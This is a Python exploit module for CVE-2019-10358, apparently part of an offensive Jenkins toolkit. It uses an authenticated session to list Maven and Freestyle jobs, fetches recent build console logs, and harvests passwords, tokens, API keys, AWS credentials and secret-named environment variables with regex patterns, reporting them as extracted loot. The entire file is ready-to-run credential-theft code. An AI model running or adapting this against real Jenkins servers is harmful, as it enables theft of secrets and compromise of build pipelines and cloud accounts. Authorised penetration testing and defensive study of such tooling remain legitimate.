"""
CVE-2019-10358: Jenkins Maven Integration Plugin Sensitive Information Disclosure

This exploit retrieves sensitive information from build logs of Maven jobs where
build variables were not properly masked due to missing build-log decorators.
"""

import re
from typing import Any

from jenkins_breaker.modules.base import ExploitMetadata, ExploitModule, ExploitResult


class CVE_2019_10358(ExploitModule):
    """Maven plugin sensitive build variable exposure in build logs."""

    CVE_ID = "CVE-2019-10358"

    METADATA = ExploitMetadata(
        cve_id="CVE-2019-10358",
        name="Jenkins Maven Plugin Sensitive Info Disclosure",
        description="Sensitive build variables exposed in Maven module build logs",
        affected_versions=["<= 3.3"],
        mitre_attack=["T1552", "T1552.001"],
        severity="medium",
        references=[
            "https://jenkins.io/security/advisory/2019-07-31/",
            "https://nvd.nist.gov/vuln/detail/CVE-2019-10358",
            "https://advisories.gitlab.com/pkg/maven/org.jenkins-ci.main/maven-plugin/CVE-2019-10358"
        ],
        requires_auth=True,
        requires_crumb=False,
        tags=["information-disclosure", "credentials", "maven", "logs"]
    )

    def check_vulnerable(self, session: Any, **kwargs: Any) -> bool:
        """
        Check if the target Jenkins instance has Maven jobs.

        Args:
            session: JenkinsSession instance
            **kwargs: Additional arguments

        Returns:
            bool: True if Maven jobs found, False otherwise
        """
        try:
            response = session.get("/api/json?tree=jobs[name,_class]")
            if response.status_code == 200:
                data = response.json()
                for job in data.get('jobs', []):
                    if 'Maven' in job.get('_class', ''):
                        return True
        except Exception:
            pass
        return False

    def _extract_secrets(self, log_text: str) -> dict[str, list[str]]:
        """
        Extract potential secrets from log text.

        Args:
            log_text: Build log text

        Returns:
            dict: Dictionary of found secrets
        """
        secrets: dict[str, list[str]] = {
            'passwords': [],
            'tokens': [],
            'api_keys': [],
            'aws_credentials': [],
            'environment_vars': []
        }

        password_patterns = [
            r'password[=:]\s*([^\s\'"]+)',
            r'PASSWORD[=:]\s*([^\s\'"]+)',
            r'pwd[=:]\s*([^\s\'"]+)',
            r'-p\s+([^\s]+)'
        ]

        token_patterns = [
            r'token[=:]\s*([a-zA-Z0-9_\-\.]+)',
            r'TOKEN[=:]\s*([a-zA-Z0-9_\-\.]+)',
            r'api[_-]?key[=:]\s*([a-zA-Z0-9_\-\.]+)',
            r'API[_-]?KEY[=:]\s*([a-zA-Z0-9_\-\.]+)'
        ]

        aws_patterns = [
            r'AWS_ACCESS_KEY_ID[=:]\s*([A-Z0-9]{20})',
            r'AWS_SECRET_ACCESS_KEY[=:]\s*([A-Za-z0-9/+=]{40})',
            r'aws_access_key_id[=:]\s*([A-Z0-9]{20})',
            r'aws_secret_access_key[=:]\s*([A-Za-z0-9/+=]{40})'
        ]

        env_var_pattern = r'^\[([A-Z_][A-Z0-9_]*)\]\s*=\s*(.+)$'

        for pattern in password_patterns:
            matches = re.finditer(pattern, log_text, re.IGNORECASE | re.MULTILINE)
            for match in matches:
                secrets['passwords'].append(match.group(1))

        for pattern in token_patterns:
            matches = re.finditer(pattern, log_text, re.IGNORECASE | re.MULTILINE)
            for match in matches:
                secrets['tokens'].append(match.group(1))

        for pattern in aws_patterns:
            matches = re.finditer(pattern, log_text, re.MULTILINE)
            for match in matches:
                secrets['aws_credentials'].append(match.group(1))

        env_matches = re.finditer(env_var_pattern, log_text, re.MULTILINE)
        for match in env_matches:
            var_name = match.group(1)
            var_value = match.group(2)
            if any(keyword in var_name.lower() for keyword in ['password', 'token', 'key', 'secret', 'api']):
                secrets['environment_vars'].append(f"{var_name}={var_value}")

        return secrets

    def run(self, session: Any, **kwargs: Any) -> ExploitResult:
        """
        Exploit CVE-2019-10358 to extract sensitive information from Maven build logs.

        Args:
            session: JenkinsSession instance
            **kwargs: Additional arguments

        Returns:
            ExploitResult: Result of the exploit
        """
        maven_jobs: list[dict[str, Any]] = []
        try:
            response = session.get("/api/json?tree=jobs[name,_class,builds[number]]")

            if response.status_code == 200:
                data = response.json()
                for job in data.get('jobs', []):
                    job_class = job.get('_class', '')
                    if 'Maven' in job_class or 'FreeStyle' in job_class:
                        maven_jobs.append({
                            'name': job['name'],
                            'builds': job.get('builds', [])[:5]
                        })

        except Exception as e:
            return ExploitResult(
                exploit=self.CVE_ID,
                status="error",
                details=f"Job discovery failed: {str(e)}"
            )

        if not maven_jobs:
            return ExploitResult(
                exploit=self.CVE_ID,
                status="failure",
                details="No Maven or Freestyle jobs found"
            )

        all_secrets: dict[str, dict[str, list[str]]] = {}
        successful_extractions = 0

        for job in maven_jobs:
            job_name = job['name']

            for build in job['builds']:
                build_number = build['number']

                try:
                    log_url = f"/job/{job_name}/{build_number}/consoleText"
                    response = session.get(log_url)

                    if response.status_code == 200:
                        log_text = response.text
                        secrets = self._extract_secrets(log_text)

                        if any(secrets.values()):
                            all_secrets[f"{job_name}_{build_number}"] = secrets
                            successful_extractions += 1

                except Exception:
                    pass

        if successful_extractions > 0:
            total_secrets = sum(
                len(values)
                for job_secrets in all_secrets.values()
                for values in job_secrets.values()
            )

            return ExploitResult(
                exploit=self.CVE_ID,
                status="success",
                details=f"Extracted secrets from {successful_extractions} builds",
                data={
                    "total_builds_checked": sum(len(job['builds']) for job in maven_jobs),
                    "builds_with_secrets": successful_extractions,
                    "total_secrets_found": total_secrets,
                    "secrets": all_secrets
                }
            )
        else:
            return ExploitResult(
                exploit=self.CVE_ID,
                status="failure",
                details="No sensitive information found in build logs"
            )
